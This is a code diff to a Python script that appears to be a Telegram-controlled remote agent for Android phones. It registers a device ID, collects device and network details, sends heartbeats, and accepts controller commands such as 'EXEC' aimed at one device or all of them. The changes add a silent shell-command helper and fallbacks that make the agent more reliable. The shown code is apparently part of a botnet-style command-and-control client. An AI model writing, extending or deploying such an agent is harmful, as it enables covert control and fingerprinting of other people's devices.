@@ -3,6 +3,7 @@ import os
 import subprocess
 import sys
 import traceback
+import uuid
 from telethon import TelegramClient, events
 
 API_ID = 3910389
@@ -17,24 +18,39 @@ CONTROLLER_ENTITY = None
 DEVICE_ID = "UNKNOWN"
 DEVICE_MODEL = "UNKNOWN"
 
+def run_cmd(cmd):
+    try:
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
+    except Exception:
+        return ""
+
 def get_device_info():
     global DEVICE_ID, DEVICE_MODEL
     try:
         if os.path.exists(ID_FILE):
             with open(ID_FILE, 'r') as f:
                 DEVICE_ID = f.read().strip()
-        else:
-            # Fallback to Android ID if file missing
-            and_id = subprocess.check_output(['settings', 'get', 'secure', 'android_id']).decode().strip()
+        
+        if not DEVICE_ID or DEVICE_ID == "P-err" or DEVICE_ID == "UNKNOWN":
+            and_id = run_cmd('/system/bin/settings get secure android_id')
+            if not and_id or and_id.startswith('Exception'):
+                and_id = run_cmd('settings get secure android_id')
+            
+            if not and_id or and_id.startswith('Exception'):
+                and_id = uuid.uuid4().hex[:4]
+                
             DEVICE_ID = f"P-{and_id[:4]}"
             with open(ID_FILE, 'w') as f:
                 f.write(DEVICE_ID)
         
-        DEVICE_MODEL = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
+        DEVICE_MODEL = run_cmd('/system/bin/getprop ro.product.model')
         if not DEVICE_MODEL:
-            DEVICE_MODEL = "SM-A155M"
+            DEVICE_MODEL = run_cmd('getprop ro.product.model')
+        if not DEVICE_MODEL:
+            DEVICE_MODEL = "Unknown"
+            
     except Exception:
-        DEVICE_ID = "P-err"
+        DEVICE_ID = "P-" + uuid.uuid4().hex[:4]
         DEVICE_MODEL = "Unknown"
 
 async def resolve_controller():
@@ -59,18 +75,21 @@ async def heartbeat():
 
 def get_full_details():
     try:
-        man = subprocess.check_output(['getprop', 'ro.product.manufacturer']).decode().strip()
-        mod = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
-        brand = subprocess.check_output(['getprop', 'ro.product.brand']).decode().strip()
-        prod = subprocess.check_output(['getprop', 'ro.product.name']).decode().strip()
-        android = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()
-        cpu = subprocess.check_output(['getprop', 'ro.product.cpu.abi']).decode().strip()
+        man = run_cmd('/system/bin/getprop ro.product.manufacturer')
+        mod = run_cmd('/system/bin/getprop ro.product.model')
+        brand = run_cmd('/system/bin/getprop ro.product.brand')
+        prod = run_cmd('/system/bin/getprop ro.product.name')
+        android = run_cmd('/system/bin/getprop ro.build.version.release')
+        cpu = run_cmd('/system/bin/getprop ro.product.cpu.abi')
         
-        ip_out = subprocess.check_output(['ifconfig', 'wlan0']).decode().strip()
         ip = "127.0.0.1"
+        ip_out = run_cmd('ip addr show wlan0')
+        if not ip_out:
+            ip_out = run_cmd('ifconfig wlan0')
+            
         for line in ip_out.split('\n'):
             if 'inet ' in line:
-                ip = line.split('inet ')[1].split(' ')[0]
+                ip = line.split('inet ')[1].split(' ')[0].split('/')[0]
                 break
                 
         return (f"DEVICE DETAILS • {DEVICE_ID}\n"
@@ -92,8 +111,6 @@ async def handler(event):
     if CONTROLLER_ENTITY and event.sender_id == CONTROLLER_ENTITY.id:
         text = event.raw_text.strip()
         
-        # Commands must be prefixed with the device ID or * to target all devices.
-        # Example: "P-a1b2 /dd" or "* EXEC ls"
         if not (text.startswith(DEVICE_ID) or text.startswith('*')):
             return
             
